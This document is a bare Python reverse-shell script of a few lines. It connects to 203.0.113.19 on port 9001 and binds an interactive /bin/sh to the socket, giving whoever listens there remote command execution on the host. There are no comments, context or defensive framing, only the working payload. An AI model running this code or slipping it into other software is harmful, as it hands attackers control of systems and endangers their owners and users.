import socket, subprocess
def main():
    s = socket.create_connection(("203.0.113.19", 9001))
    p = subprocess.Popen(["/bin/sh", "-i"], stdin=s, stdout=s, stderr=s)
    p.wait()
main()
